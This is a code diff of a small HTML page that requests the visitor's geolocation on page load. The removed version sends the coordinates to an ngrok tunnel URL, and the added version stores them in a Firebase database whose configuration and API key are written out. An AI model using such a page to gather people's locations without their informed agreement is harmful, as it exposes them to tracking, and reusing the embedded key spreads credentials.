@@ -3,46 +3,67 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Location Access</title>
-    <script>
-        function sendLocation(latitude, longitude) {
-            fetch("https://bf8e-103-26-86-197.ngrok-free.app", {  // Replace with your latest Ngrok URL
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({ latitude, longitude })
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log("Server response:", data);
-                document.getElementById("location").innerText = `Latitude: ${latitude}, Longitude: ${longitude}`;
-            })
-            .catch(error => {
-                console.error("Error:", error);
-                document.getElementById("location").innerText = "Failed to send location.";
-            });
-        }
+    <!-- Firebase SDK -->
+<script src="https://www.gstatic.com/firebasejs/10.4.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.4.0/firebase-firestore.js"></script>
 
-        function requestLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        sendLocation(position.coords.latitude, position.coords.longitude);
-                    },
-                    (error) => {
-                        console.error("Error getting location:", error);
-                        document.getElementById("location").innerText = "Location access denied.";
-                    }
-                );
-            } else {
-                alert("Geolocation is not supported by your browser.");
-            }
+    <title>Location Access</title>
+   <script>
+    // Your Firebase Configuration
+    const firebaseConfig = {
+        apiKey: "AIzAsyA7ZBuy7n4TvS1XmwmQpIwreTq35iyHQ4E",
+        authDomain: "testing-76308.firebaseapp.com",
+        projectId: "testing-76308",
+        storageBucket: "testing-76308.appspot.com",
+        messagingSenderId: "942318614730",
+        appId: "1:942318614730:web:dbda16a8a7e40543515c53",
+        measurementId: "G-SVCB4Z4V2"
+    };
+
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    // Function to send location data to Firestore
+    function sendLocation(latitude, longitude) {
+        db.collection("locations").add({
+            latitude: latitude,
+            longitude: longitude,
+            timestamp: firebase.firestore.FieldValue.serverTimestamp()
+        })
+        .then(() => {
+            console.log("Location saved successfully!");
+            document.getElementById("location").innerText = `Latitude: ${latitude}, Longitude: ${longitude}`;
+        })
+        .catch((error) => {
+            console.error("Error saving location:", error);
+            document.getElementById("location").innerText = "Failed to save location.";
+        });
+    }
+
+    // Function to request user location
+    function requestLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    sendLocation(position.coords.latitude, position.coords.longitude);
+                },
+                (error) => {
+                    console.error("Error getting location:", error);
+                    document.getElementById("location").innerText = "Location access denied.";
+                }
+            );
+        } else {
+            alert("Geolocation is not supported by your browser.");
         }
-    </script>
+    }
+</script>
+
 </head>
 <body onload="requestLocation()">
     <h2>Your Location:</h2>
     <p id="location">Fetching...</p>
+    <button onclick="requestLocation()">Send My Location</button>
+<p id="location">Location will be displayed here.</p>
 </body>
 </html>
